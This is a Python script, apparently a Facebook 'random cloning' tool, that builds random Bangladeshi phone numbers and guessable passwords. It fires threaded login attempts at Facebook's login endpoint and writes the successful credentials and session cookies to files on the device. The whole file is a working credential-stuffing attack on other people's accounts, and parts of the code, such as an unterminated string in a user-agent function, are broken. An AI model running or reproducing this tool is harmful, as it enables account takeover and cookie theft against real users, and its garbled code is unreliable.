#--------------------------(IMPORT BOX)--------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
    
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
#--------------------------(COLOUR BOX)--------------------------#    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
#--------------------------(COUNT BOX)--------------------------#
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
#--------------------------(DEF-MENU)--------------------------#
def iAmAndroidUa():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[Davlik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]"
    ua = random.choice(['
#--------------------------(LOGO BOX)--------------------------#
logo =("""


<=================================================>
       _____ _    _          _    _  ____        |
      / ____| |  | |   /\   | |  | |/ __ \       |
     | (___ | |__| |  /  \  | |__| | |  | |      |
      \___ \|  __  | / /\ \ |  __  | |  | |      |
      ____) | |  | |/ ____ \| |  | | |__| |      |
     |_____/|_|  |_/_/    \_\_|  |_|\____/       |
                                                 |
<=================================================>                                      
\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mOWNER     \033[1;31m● \x1b[38;5;46mGAMING SHAHO
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mGAMING SHAHO
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m1.2
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46mRandom Cloning
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46mFREE
\033[1;31m[\033[1;32m=\033[1;96m]  \x1b[38;5;46mwHATSAPP  \033[1;96m●\x1b[38;5;46m01951153459
\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")

linex=('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')   
#--------------------------(MENU BOX)--------------------------#
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START RANDOM CLONE')
        print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;46m EXIT')
        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
        Shorif =input("\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE : ")
        if Shorif in ["1", "01"]:
            v2()
        else:
            exit()
#--------------------------(COLOUR BOX)--------------------------#

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#--------------------------(CLONING MENU BOX)--------------------------#
def v2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] BD NUMBER  => 016 017 018 019')
    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000. 5000. 10000. 15000. 50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as akash:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m SIM CODE : '+kode)
        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m CRACK ID : '+tl)
        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080']
            akash.submit(rcrack1,uid,pwx,tl)
    print(linex)
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(linex)
#--------------------------(MATHOD BOX)--------------------------#
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sSHAHO\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://www.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"} 
	    header_freefb = {'authority': 'www.facebook.com',
           'method':'GET',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
           'cache-control': 'max-age=0',
           'referer': 'https://www.google.com/',
           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-platform': '"Linux"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'cross-site',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]'
           'viewport-width': '980',}		
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[SHAHO-OK🥰] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/SHAHO-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[SHAHO-CP😒] {uid}|{ps}")
                open('/sdcard/SHAHO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

Main()
